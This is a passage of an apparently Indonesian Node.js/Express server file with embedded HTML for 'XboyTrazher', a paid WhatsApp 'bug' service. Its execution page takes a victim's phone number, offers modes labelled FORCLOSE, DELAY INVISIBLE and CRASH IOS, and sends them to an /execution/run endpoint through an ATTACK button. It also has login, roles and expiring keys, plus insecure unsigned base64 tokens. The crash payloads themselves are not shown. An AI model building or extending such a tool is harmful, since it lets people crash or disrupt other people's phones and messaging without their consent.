
    @keyframes progress {
      from { transform: scaleX(1); }
      to { transform: scaleX(0); }
    }

    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }

    @keyframes bounceIn {
      0% {
        transform: translateX(400px) scale(0.3);
        opacity: 0;
      }
      50% {
        transform: translateX(0) scale(1.05);
      }
      70% {
        transform: translateX(0) scale(0.95);
      }
      100% {
        transform: translateX(0) scale(1);
        opacity: 1;
      }
    }

    @keyframes slideOut {
      0% {
        transform: translateX(0) scale(1);
        opacity: 1;
      }
      30% {
        transform: translateX(-50px) scale(0.95);
        opacity: 0.7;
      }
      100% {
        transform: translateX(400px) scale(0.3);
        opacity: 0;
      }
    }

    /* BOTTOM MENU - DIAMBIL 100% DARI CONTOH DASHBOARD */
    .bottom-menu {
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100%;
      background: rgba(0, 0, 0, 0.9);
      backdrop-filter: blur(10px);
      border-top: 1px solid rgba(30, 58, 138, 0.3);
      z-index: 1000;
      padding: 10px 0;
    }

    .menu-container {
      display: flex;
      justify-content: space-around;
      align-items: center;
      max-width: 500px;
      margin: 0 auto;
    }

    .menu-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      color: #cccccc;
      text-decoration: none;
      padding: 8px 12px;
      border-radius: 10px;
      transition: all 0.3s ease;
      flex: 1;
      text-align: center;
    }

    .menu-item.active,
    .menu-item:hover {
      background: rgba(30, 58, 138, 0.2);
      color: #ffffff;
    }

    .menu-icon {
      font-size: 1.2rem;
      margin-bottom: 5px;
    }

    .menu-label {
      font-size: 0.7rem;
    }
  </style>
</head>
<body>
  <div id="particles-js"></div>

  <!-- Notifikasi Custom -->
  <div id="customNotification" class="custom-notification">
    <div class="notification-icon">
      <i class="fas fa-check"></i>
    </div>
    <div class="notification-content">
      <div class="notification-title">Success</div>
      <div class="notification-message">Pesan berhasil dikirim</div>
    </div>
    <div class="notification-progress"></div>
  </div>

  <div class="app-wrapper">
    <!-- Container untuk Role dan Video -->
    <div class="container role-container">
      <div class="video-banner">
        <video autoplay muted loop playsinline>
          <source src="https://files.catbox.moe/ar2frm.mp4" type="video/mp4">
        </video>
      </div>

      <div class="profile-card">
        <div class="username">Welcome, ${username || 'Anonymous'}</div>
        <div id="botStatus" class="disconnected">NOT CONNECTED</div>
        <div class="profile-details">
          Role: <span>...?</span> • Exp: <span>${formattedTime || 'Unlimited'}</span>
        </div>
      </div>
    </div>

    <!-- Container untuk Bug -->
    <div class="container bug-container">
      <!-- Setting Number -->
      <label class="input-label">Setting Number</label>
      <input type="text" class="input-field" placeholder="e.g. 628xxxxx" />

      <!-- Pilih Bug -->
      <label class="input-label">Pilih Bug</label>
      <div class="dropdown">
        <button id="showModesBtn" class="dropbtn" type="button">
          <i class="fas fa-cogs"></i> Pilih Mode
        </button>
        <div class="dropdown-content" id="modesContainer">
          <button class="mode-btn" data-mode="crashforce"><i class="fa fa-fire"></i>FORCLOSE</button>
          <button class="mode-btn" data-mode="delayinvis"><i class="fa fa-ghost"></i>DELAY INVISIBLE</button>
          <button class="mode-btn" data-mode="ios"><i class="fa fa-skull-crossbones"></i>CRASH IOS</button>
        </div>
      </div>

      <button id="executeBtn" class="execute-button" disabled>ATTACK</button>
    </div>
  </div>

  <!-- BOTTOM MENU - DIAMBIL 100% SAMA DARI CONTOH DASHBOARD -->
  <div class="bottom-menu" id="bottomMenu">
    <div class="menu-container">
      <a href="/dashboard" class="menu-item"><i class="fas fa-home menu-icon"></i><span class="menu-label">Dashboard</span></a>
      <a href="/execution" class="menu-item active"><i class="fas fa-bolt menu-icon"></i><span class="menu-label">Execution</span></a>
      <a href="/tools" class="menu-item"><i class="fas fa-tools menu-icon"></i><span class="menu-label">Tools</span></a>
      <a href="/channel" class="menu-item"><i class="fab fa-whatsapp menu-icon"></i><span class="menu-label">Channel</span></a>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      particlesJS('particles-js', {
        particles: {
          number: { value: 80, density: { enable: true, value_area: 800 } },
          color: { value: "#6082EE" },
          opacity: { value: 0.4, random: true },
          size: { value: 3, random: true },
          line_linked: {
            enable: true,
            distance: 150,
            color: "#6082EE",
            opacity: 0.3,
            width: 1
          },
          move: { enable: true, speed: 2, random: true }
        },
        interactivity: {
          detect_on: "canvas",
          events: { onhover: { enable: true, mode: "repulse" } },
          modes: { repulse: { distance: 100 } }
        },
        retina_detect: true
      });
    });

    // fix menu keyboard naik
    const bottomMenuFix = document.getElementById("bottomMenu");
    if (window.visualViewport) {
      window.visualViewport.addEventListener("resize", () => {
        if (window.visualViewport.height < window.innerHeight * 0.8) {
          bottomMenuFix.style.display = "none";
        } else {
          bottomMenuFix.style.display = "block";
        }
      });
    }

    // Script lainnya yang sudah ada...
    function updateBotStatus() {
      fetch('/status')
        .then(res => res.json())
        .then(data => {
          const botStatusEl = document.getElementById('botStatus');
          if (data.connected) {
            botStatusEl.textContent = "CONNECTED";
            botStatusEl.classList.remove("disconnected");
            botStatusEl.classList.add("connected");
          } else {
            botStatusEl.textContent = "NOT CONNECTED";
            botStatusEl.classList.remove("connected");
            botStatusEl.classList.add("disconnected");
          }
        })
        .catch(() => {
          const botStatusEl = document.getElementById('botStatus');
          botStatusEl.textContent = "ERROR";
          botStatusEl.classList.remove("connected");
          botStatusEl.classList.add("disconnected");
        });
    }

    // cek pertama kali pas halaman dibuka
    updateBotStatus();

    // auto refresh status setiap 5 detik
    setInterval(updateBotStatus, 5000);
  </script>

  <script>
    // 🔘 Mode select
    const inputField = document.querySelector('input[type="text"]');
    const executeBtn = document.getElementById('executeBtn');
    const dropdownContent = document.querySelector('.dropdown-content');
    const dropdownBtn = document.querySelector('.dropbtn');
    let selectedMode = null;

    // event listener untuk semua item dropdown
    document.querySelectorAll('.dropdown-content button').forEach(item => {
      item.addEventListener('click', function () {
        // simpan mode yg dipilih
        selectedMode = this.getAttribute('data-mode');
        
        // ubah text tombol utama sesuai pilihan
        dropdownBtn.innerHTML = this.innerHTML;

        // aktifkan tombol EXECUTE
        executeBtn.disabled = false;
        executeBtn.classList.add("active");

        // tutup dropdown
        dropdownContent.style.display = "none";
      });
    });

    // buka/tutup dropdown saat tombol ditekan
    dropdownBtn.addEventListener('click', function () {
      dropdownContent.style.display =
        dropdownContent.style.display === "block" ? "none" : "block";
    });

    // NOTIFIKASI CUSTOM FUNCTION
    function showNotification(type, title, message, duration = 3000) {
      const notification = document.getElementById('customNotification');
      const icon = notification.querySelector('.notification-icon');
      const iconElement = icon.querySelector('i');
      const titleElement = notification.querySelector('.notification-title');
      const messageElement = notification.querySelector('.notification-message');
      
      // Reset classes
      notification.className = 'custom-notification';
      icon.className = 'notification-icon';
      
      // Set content
      titleElement.textContent = title;
      messageElement.textContent = message;
      
      // Set type and icon
      switch(type) {
        case 'success':
          notification.classList.add('notification-success');
          iconElement.className = 'fas fa-check';
          break;
        case 'error':
          notification.classList.add('notification-error');
          iconElement.className = 'fas fa-times';
          break;
        case 'warning':
          notification.classList.add('notification-warning');
          iconElement.className = 'fas fa-exclamation-triangle';
          break;
        case 'info':
          notification.classList.add('notification-info');
          iconElement.className = 'fas fa-info-circle';
          break;
      }
      
      // Show notification with animation
      notification.classList.add('show');
      notification.style.animation = 'bounceIn 0.6s ease-out';
      
      // Auto hide after duration
      setTimeout(() => {
        notification.style.animation = 'slideOut 0.5s ease-in';
        setTimeout(() => {
          notification.classList.remove('show');
        }, 500);
      }, duration);
    }

    // 🚀 Eksekusi dengan notifikasi custom
    executeBtn.addEventListener('click', () => {
      const number = inputField.value.trim();

      fetch('/status')
        .then(res => res.json())
        .then(data => {
          if (!data.connected) {
            showNotification('error', 'Bot Belum Terhubung', 'Pastikan ada bot WhatsApp yang aktif.', 4000);
            return;
          }
          return fetch("/execution/run?mode=" + selectedMode + "&target=" + number, {
            headers: { "Accept": "application/json" }
          });
        })
        .then(async res => {
          if (!res) return;
          const data = await res.json();

          if (!res.ok || !data.success) {
            showNotification('warning', 'Cooldown', data.message || 'Tunggu sebentar sebelum eksekusi lagi.', 3000);
            return;
          }

          showNotification('success', 'Success', data.message, 2000);
        })
        .catch(() => {
          showNotification('error', 'Gagal Eksekusi', 'Terjadi kesalahan saat menghubungi server.', 4000);
        });
    });

    // close dropdown jika klik di luar
    window.addEventListener("click", function (e) {
      if (!e.target.closest('.dropdown')) {
        dropdownContent.style.display = "none";
      }
    });
  </script>
  
  <script>
    const bottomMenu = document.querySelector('.bottom-menu');

    if (window.visualViewport) {
      const initialHeight = window.visualViewport.height;

      window.visualViewport.addEventListener('resize', () => {
        const heightDiff = initialHeight - window.visualViewport.height;

        if (heightDiff > 150) {
          // Keyboard muncul
          bottomMenu.style.transform = 'translateY(100%)';
          bottomMenu.style.transition = 'transform 0.3s ease';
        } else {
          // Keyboard ditutup
          bottomMenu.style.transform = 'translateY(0)';
        }
      });
    }
  </script>
</body>
</html>
`;
};

// Appp Get root Server \\
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

// ✅ FIX login ulang tanpa ubah struktur /auth
app.use((req, res, next) => {
  if (req.cookies?.sessionUser && req.method === "POST" && req.path === "/auth") {
    const users = getUsers();
    const u = users.find(x => x.username === req.cookies.sessionUser);
    if (u) {
      req.body.username = u.username;
      req.body.key = u.key;
      req.body.deviceId = u.deviceId || "auto";
    }
  }
  next();
});

const verifyToken = (tokens) => {
  try {
    if (!tokens) return null;
    
    // Decode base64 token
    const decoded = Buffer.from(tokens, 'base64').toString();
    const payload = JSON.parse(decoded);
    
    console.log('🔐 Token payload:', payload);
    
    // Simple validation - cukup cek ada username
    if (payload && payload.username) {
      return payload;
    }
    
    return null;
  } catch (error) {
    console.error('❌ Token verification error:', error);
    return null;
  }
};

const requireAuth = (req, res, next) => {
  const tokens = req.headers.authorization?.replace('Bearer ', '');
  console.log('🔑 Received token:', tokens);
  
  const payload = verifyToken(tokens);
  if (!payload) {
    console.log('❌ Unauthorized: Invalid token');
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }
  
  req.user = payload;
  console.log('✅ Authenticated user:', payload.username);
  next();
};

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "XMboy", "First-View.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca First-View.html");
    res.send(html);
  });
});

app.get('/tools', (req, res) => {
  res.sendFile(path.join(__dirname, 'XMboy', 'Tools.html'));
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "XMboy", "Login.html");

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");

    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key, deviceId } = req.body;
  const users = getUsers();

  // ✅ Normalisasi input agar login tetap cocok meski huruf/spasi beda
  const usernameInput = (username || "").toString().trim().toLowerCase();
  const keyInput = (key || "").toString().trim().toLowerCase();

  // ✅ Cari user dengan normalisasi (tanpa ubah struktur)
  const user = users.find(u => {
    const storedUsername = (u.username || "").toString().trim().toLowerCase();
    const storedKey = (u.key || "").toString().trim().toLowerCase();
    return storedUsername === usernameInput && storedKey === keyInput;
  });

  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  if (Date.now() > user.expired) {
    return res.redirect("/login?msg=" + encodeURIComponent("Key sudah expired!"));
  }

  if (user.deviceId && user.deviceId !== deviceId) {
    return res.redirect("/login?msg=" + encodeURIComponent("Perangkat tidak dikenali!"));
  }

  if (!user.deviceId) {
    user.deviceId = deviceId;
    saveUsers(users);
  }

  // ✅ Simpan cookie dengan username asli dari database
  res.cookie("sessionUser", user.username, { maxAge: 60 * 60 * 1000 });

  // 🔹 Role yang bisa akses dashboard
  const dashboardRoles = ["owner", "admin", "vip"];
  if (dashboardRoles.includes(user.role)) {
    return res.redirect("/dashboard");
  }

  res.redirect("/execution");
});

function convertDaysToTimestamp(days) {
  return Date.now() + days * 24 * 60 * 60 * 1000;
}

// ===== Halaman Channel WhatsApp =====
app.get("/channel", (req, res) => {
  const username = req.cookies?.sessionUser || "Anonymous";
  const users = getUsers();
  const user = users.find(u => u.username === username);
  const expired = user?.expired || null;
  const status = expired && Date.now() < expired ? 'Premium Member' : 'Free Member';

  const html = `<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
  <title>Channel WhatsApp - XboyTrazher</title>
  <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet">
  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">

  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    html, body {
      font-family: 'Poppins', sans-serif;
      background: #000;
      color: white;
      height: 100%;
      width: 100%;
      overflow-x: hidden;
      position: relative;
    }

    body {
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding: 20px;
      padding-bottom: 100px;
      position: relative;
      z-index: 1;
      background: linear-gradient(135deg, #0a0a2a 0%, #000000 50%, #1a1a4a 100%);
    }

    #particles-js {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 0;
    }

    .back-to-dashboard {
      position: absolute;
      top: 15px;
      left: 15px;
      color: #fff;
      text-decoration: none;
      background: rgba(30, 58, 138, 0.3);
      padding: 6px 10px;
      border-radius: 8px;
      font-size: 14px;
      z-index: 2;
      display: flex;
      align-items: center;
      gap: 5px;
      transition: all 0.3s ease;
      backdrop-filter: blur(10px);
      border: 1px solid rgba(30, 58, 138, 0.3);
    }

    .back-to-dashboard:hover {
      background: rgba(30, 58, 138, 0.5);
      box-shadow: 0 0 15px rgba(30, 58, 138, 0.4);
    }

    .container {
      width: 100%;
      max-width: 420px;
      background: rgba(30, 58, 138, 0.08);
      border: 1px solid rgba(30, 58, 138, 0.3);
      border-radius: 20px;
      box-shadow: 
        0 8px 32px rgba(30, 58, 138, 0.3),
        inset 0 1px 0 rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(15px);
      -webkit-backdrop-filter: blur(15px);
      padding: 24px;
      z-index: 1;
      position: relative;
    }

    .app-header {
      text-align: center;
      margin-bottom: 20px;
    }

    .app-logo {
      width: 80px;
      height: 80px;
      border-radius: 20px;
      margin: 0 auto 15px;
      background: linear-gradient(135deg, #1e3a8a, #3b82f6);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 32px;
      box-shadow: 0 0 20px rgba(30, 58, 138, 0.5);
    }

    .app-name {
      font-size: 24px;
      font-weight: 700;
      background: linear-gradient(45deg, #60a5fa, #3b82f6);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 5px;
    }

    .app-tagline {
      font-size: 14px;
      color: #bfdbfe;
      margin-bottom: 20px;
    }

    .channel-card {
      background: rgba(30, 58, 138, 0.1);
      border: 1px solid rgba(30, 58, 138, 0.3);
      border-radius: 15px;
      padding: 20px;
      margin-bottom: 15px;
      transition: all 0.3s ease;
      cursor: pointer;
      backdrop-filter: blur(10px);
    }

    .channel-card:hover {
      background: rgba(30, 58, 138, 0.15);
      transform: translateY(-2px);
      box-shadow: 0 8px 25px rgba(30, 58, 138, 0.3);
    }

    .channel-header {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 10px;
    }

    .channel-icon {
      width: 40px;
      height: 40px;
      background: linear-gradient(135deg, #1e3a8a, #3b82f6);
      border-radius: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 18px;
      box-shadow: 0 4px 15px rgba(30, 58, 138, 0.4);
    }

    .channel-info h3 {
      font-size: 16px;
      font-weight: 600;
      margin-bottom: 2px;
      color: #bfdbfe;
    }

    .channel-info p {
      font-size: 12px;
      color: #93c5fd;
    }

    .channel-description {
      font-size: 13px;
      color: #93c5fd;
      line-height: 1.4;
    }

    .join-button {
      width: 100%;
      background: linear-gradient(135deg, #1e3a8a, #3b82f6);
      border: none;
      border-radius: 10px;
      padding: 12px;
      color: white;
      font-weight: 600;
      margin-top: 10px;
      cursor: pointer;
      transition: all 0.3s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      backdrop-filter: blur(10px);
      border: 1px solid rgba(59, 130, 246, 0.3);
    }

    .join-button:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 20px rgba(30, 58, 138, 0.5);
      background: linear-gradient(135deg, #3b82f6, #1e3a8a);
    }

    .features-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
      margin-top: 20px;
    }

    .feature-item {
      background: rgba(30, 58, 138, 0.1);
      border: 1px solid rgba(30, 58, 138, 0.2);
      border-radius: 10px;
      padding: 12px;
      text-align: center;
      transition: all 0.3s ease;
      backdrop-filter: blur(10px);
    }

    .feature-item:hover {
      background: rgba(30, 58, 138, 0.15);
      transform: translateY(-2px);
      box-shadow: 0 4px 15px rgba(30, 58, 138, 0.2);
    }

    .feature-icon {
      font-size: 20px;
      margin-bottom: 5px;
      color: #60a5fa;
    }

    .feature-text {
      font-size: 11px;
      font-weight: 600;
      color: #bfdbfe;
    }

    .bottom-menu {
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100%;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      border-top: 1px solid rgba(30, 58, 138, 0.4);
      z-index: 10;
      padding: 12px 0;
    }

    .menu-container {
      display: flex;
      justify-content: space-around;
      align-items: center;
      max-width: 500px;
      margin: 0 auto;
    }

    .menu-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      color: rgba(255, 255, 255, 0.7);
      text-decoration: none;
      padding: 8px 12px;
      border-radius: 12px;
      transition: all 0.3s ease;
      flex: 1;
      text-align: center;
      background: rgba(30, 58, 138, 0.1);
      backdrop-filter: blur(10px);
    }

    .menu-item.active,
    .menu-item:hover {
      background: rgba(30, 58, 138, 0.3);
      color: #ffffff;
      box-shadow: 0 5px 15px rgba(30, 58, 138, 0.4);
      transform: translateY(-2px);
    }

    .menu-icon {
      font-size: 1.2rem;
      margin-bottom: 5px;
    }

    .menu-label {
      font-size: 0.7rem;
    }

    .user-info {
      text-align: center;
      margin-bottom: 20px;
      padding: 10px;
      background: rgba(30, 58, 138, 0.1);
      border-radius: 10px;
      backdrop-filter: blur(10px);
      border: 1px solid rgba(30, 58, 138, 0.2);
    }

    .username {
      font-size: 16px;
      font-weight: 600;
      margin-bottom: 5px;
      color: #bfdbfe;
    }

    .user-status {
      font-size: 12px;
      color: #93c5fd;
    }

    .status-premium {
      color: #60a5fa;
    }

    .status-free {
      color: #93c5fd;
    }

    /* Video Background */
    .video-banner {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -2;
      overflow: hidden;
    }

    .video-banner video {
      width: 100%;
      height: 100%;
      object-fit: cover;
      opacity: 0.2;
      filter: brightness(0.6) contrast(1.2);
    }

    .video-banner::after {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: radial-gradient(circle at center, rgba(30, 58, 138, 0.3), rgba(0, 0, 0, 0.9));
    }
  </style>
</head>
<body>
  <!-- Video Background -->
  <div class="video-banner">
    <video autoplay muted loop playsinline>
      <source src="https://files.catbox.moe/ar2frm.mp4" type="video/mp4">
    </video>
  </div>

  <div id="particles-js"></div>

  <a href="/dashboard" class="back-to-dashboard">
    <i class="fas fa-arrow-left"></i> Back
  </a>

  <div class="container">
    <div class="app-header">
      <div class="app-logo">
        <i class="fab fa-whatsapp"></i>
      </div>
      <div class="app-name">XboyTrazher</div>
      <div class="app-tagline">WhatsApp Automation Tool</div>
    </div>

    <div class="channel-card">
      <div class="channel-header">
        <div class="channel-icon">
          <i class="fab fa-whatsapp"></i>
        </div>
        <div class="channel-info">
          <h3>Official WhatsApp Channel</h3>
          <p>XboyTrazher Updates</p>
        </div>
      </div>
      <div class="channel-description">
        Bergabunglah dengan channel WhatsApp resmi kami untuk mendapatkan update terbaru, fitur baru, dan informasi penting seputar XboyTrazher.
      </div>
      <button class="join-button" onclick="joinChannel()">
        <i class="fab fa-whatsapp"></i> Join Channel WhatsApp
      </button>
    </div>

    <div class="features-grid">
      <div class="feature-item">
        <div class="feature-icon">
          <i class="fas fa-bolt"></i>
        </div>
        <div class="feature-text">Fast Execution</div>
      </div>
      <div class="feature-item">
        <div class="feature-icon">
          <i class="fas fa-shield-alt"></i>
        </div>
        <div class="feature-text">Secure</div>
      </div>
      <div class="feature-item">
        <div class="feature-icon">
          <i class="fas fa-sync"></i>
        </div>
        <div class="feature-text">Auto Update</div>
      </div>
      <div class="feature-item">
        <div class="feature-icon">
          <i class="fas fa-headset"></i>
        </div>
        <div class="feature-text">24/7 Support</div>
      </div>
    </div>
  </div>

  <div class="bottom-menu" id="bottomMenu">
    <div class="menu-container">
      <a href="/dashboard" class="menu-item"><i class="fas fa-home menu-icon"></i><span class="menu-label">Dashboard</span></a>
      <a href="/execution" class="menu-item"><i class="fas fa-bolt menu-icon"></i><span class="menu-label">Execution</span></a>
      <a href="/tools" class="menu-item"><i class="fas fa-tools menu-icon"></i><span class="menu-label">Tools</span></a>
      <a href="/channel" class="menu-item active"><i class="fab fa-whatsapp menu-icon"></i><span class="menu-label">Channel</span></a>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

  <script>
    // Initialize particles dengan tema biru
    particlesJS('particles-js', {
      particles: {
        number: { value: 60, density: { enable: true, value_area: 800 } },
        color: { value: "#1e3a8a" },
        opacity: { value: 0.4, random: true },
        size: { value: 3, random: true },
        line_linked: {
          enable: true,
          distance: 150,
          color: "#1e3a8a",
          opacity: 0.3,
          width: 1
        },
        move: { enable: true, speed: 2, random: true }
      },
      interactivity: {
        detect_on: "canvas",
        events: { onhover: { enable: true, mode: "repulse" } },
        modes: { repulse: { distance: 100 } }
      },
      retina_detect: true
    });

    // Join channel function
    function joinChannel() {
      Swal.fire({
        title: 'Join Channel WhatsApp',
        html: '<div style="text-align: center;"><div style="font-size: 48px; color: #1e3a8a; margin-bottom: 20px;"><i class="fab fa-whatsapp"></i></div><p style="margin-bottom: 20px;">Klik tombol di bawah untuk bergabung dengan channel WhatsApp resmi <strong>XboyTrazher</strong></p></div>',
        showCancelButton: true,
        confirmButtonText: 'Join Channel',
        cancelButtonText: 'Cancel',
        confirmButtonColor: '#1e3a8a',
        background: 'rgba(10, 10, 42, 0.95)',
        color: 'white',
        backdrop: 'rgba(0, 0, 0, 0.7)'
      }).then((result) => {
        if (result.isConfirmed) {
          // Ganti dengan link channel WhatsApp Anda yang sebenarnya
          window.open('https://whatsapp.com/channel/0029VbBFQNb17En3MAIHaU3R', '_blank');
          
          Swal.fire({
            title: 'Success!',
            text: 'Anda akan diarahkan ke channel WhatsApp kami',
            icon: 'success',
            confirmButtonColor: '#1e3a8a',
            background: 'rgba(10, 10, 42, 0.95)',
            color: 'white',
            timer: 2000
          });
        }
      });
    }

    // Handle keyboard appearance on mobile
    const bottomMenu = document.querySelector('.bottom-menu');
    if (window.visualViewport) {
      window.visualViewport.addEventListener('resize', () => {
        const heightDiff = window.innerHeight - window.visualViewport.height;
        if (heightDiff > 150) {
          bottomMenu.style.transform = 'translateY(100%)';
          bottomMenu.style.transition = 'transform 0.3s ease';
        } else {
          bottomMenu.style.transform = 'translateY(0)';
        }
      });
    }

    // Auto-hide bottom menu when keyboard appears (mobile)
    document.addEventListener('DOMContentLoaded', function() {
      const bottomMenu = document.getElementById('bottomMenu');
      
      if (window.visualViewport) {
        const initialHeight = window.visualViewport.height;
        
        window.visualViewport.addEventListener('resize', () => {
          const heightDiff = initialHeight - window.visualViewport.height;
          
          if (heightDiff > 150) {
            // Keyboard muncul
            bottomMenu.style.transform = 'translateY(100%)';
            bottomMenu.style.transition = 'transform 0.3s ease';
          } else {
            // Keyboard ditutup
            bottomMenu.style.transform = 'translateY(0)';
          }
        });
      }
    });
  </script>
</body>
</html>`;

  res.send(html);
});

// === Halaman Add User (Akun) ===
app.get("/add-user", (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) return res.send("❌ Session tidak ditemukan.");

  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  if (!currentUser) return res.send("❌ User tidak valid.");

  const allowedRoles = ["owner", "admin", "vip"];
  if (!allowedRoles.includes(currentUser.role)) {
    return res.status(403).send("❌ Kamu tidak punya akses ke halaman ini.");
  }

  const roleOptionsByRole = {
    vip: ["user"],
    admin: ["vip", "user"],
    owner: ["admin", "vip", "user"]
  };

  const roleOptionsForForm = roleOptionsByRole[currentUser.role]
    .map(role => `<option value="${role}">${role.charAt(0).toUpperCase() + role.slice(1)}</option>`)
    .join("");

  res.send(`
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Add User - XboyTrazher</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/particles.js"></script>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    html, body {
      font-family: 'Poppins', sans-serif;
      background: #000;
      color: white;
      height: 100%;
      width: 100%;
      overflow-x: hidden;
      position: relative;
    }

    body {
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding: 15px;
      padding-bottom: 80px;
      position: relative;
      z-index: 1;
      background: linear-gradient(135deg, #0a0a2a 0%, #000000 50%, #1a1a4a 100%);
    }

    #particles-js {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 0;
    }

    .video-banner {
      width: 100%;
      height: 120px;
      border-radius: 12px;
      overflow: hidden;
      margin-bottom: 15px;
      box-shadow: 0 4px 15px rgba(30, 58, 138, 0.4);
      border: 1px solid rgba(30, 58, 138, 0.4);
      background: rgba(30, 58, 138, 0.1);
    }

    .video-banner video {
      width: 100%;
      height: 100%;
      object-fit: cover;
      filter: brightness(0.9) contrast(1.1);
    }

    .form-card {
      background: rgba(30, 58, 138, 0.08);
      border: 1px solid rgba(30, 58, 138, 0.3);
      backdrop-filter: blur(15px);
      -webkit-backdrop-filter: blur(15px);
      animation: fadeInUp 0.8s ease both;
      box-shadow: 
        0 6px 20px rgba(30, 58, 138, 0.3),
        inset 0 1px 0 rgba(255, 255, 255, 0.1);
      padding: 20px;
    }

    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    button.glow {
      background: linear-gradient(135deg, #1e3a8a, #3b82f6);
      box-shadow: 0 0 15px rgba(30, 58, 138, 0.6);
      transition: all 0.3s ease;
      border: 1px solid rgba(59, 130, 246, 0.3);
      font-size: 14px;
      padding: 10px;
    }

    button.glow:hover {
      transform: scale(1.02);
      box-shadow: 0 0 20px rgba(30, 58, 138, 0.8);
      background: linear-gradient(135deg, #3b82f6, #1e3a8a);
    }

    .bottom-menu {
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100%;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(15px);
      -webkit-backdrop-filter: blur(15px);
      border-top: 1px solid rgba(30, 58, 138, 0.4);
      z-index: 1000;
      padding: 10px 0;
    }

    .menu-container {
      display: flex;
      justify-content: space-around;
      align-items: center;
      max-width: 400px;
      margin: 0 auto;
    }

    .menu-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      color: rgba(255, 255, 255, 0.7);
      text-decoration: none;
      padding: 6px 8px;
      border-radius: 10px;
      transition: all 0.3s ease;
      flex: 1;
      text-align: center;
      background: rgba(30, 58, 138, 0.1);
      backdrop-filter: blur(8px);
      font-size: 0.7rem;
    }

    .menu-item:hover {
      background: rgba(30, 58, 138, 0.3);
      color: #ffffff;
      box-shadow: 0 3px 10px rgba(30, 58, 138, 0.4);
      transform: translateY(-1px);
    }

    .menu-item.active {
      background: rgba(30, 58, 138, 0.3);
      color: #ffffff;
      box-shadow: 0 3px 10px rgba(30, 58, 138, 0.4);
    }

    .menu-icon {
      font-size: 1rem;
      margin-bottom: 3px;
    }

    .menu-label {
      font-size: 0.65rem;
    }

    .back-to-dashboard {
      position: absolute;
      top: 10px;
      left: 10px;
      color: #fff;
      text-decoration: none;
      background: rgba(30, 58, 138, 0.3);
      padding: 5px 8px;
      border-radius: 6px;
      font-size: 12px;
      z-index: 2;
      display: flex;
      align-items: center;
      gap: 4px;
      transition: all 0.3s ease;
      backdrop-filter: blur(8px);
      border: 1px solid rgba(30, 58, 138, 0.3);
    }

    .back-to-dashboard:hover {
      background: rgba(30, 58, 138, 0.5);
      box-shadow: 0 0 10px rgba(30, 58, 138, 0.4);
    }

    /* Custom input styles */
    .input-field {
      background: rgba(30, 58, 138, 0.1);
      border: 1px solid rgba(30, 58, 138, 0.4);
      color: #bfdbfe;
      backdrop-filter: blur(8px);
      font-size: 14px;
      padding: 8px;
    }

    .input-field::placeholder {
      color: #93c5fd;
      font-size: 13px;
    }

    .input-field:focus {
      border-color: rgba(30, 58, 138, 0.8);
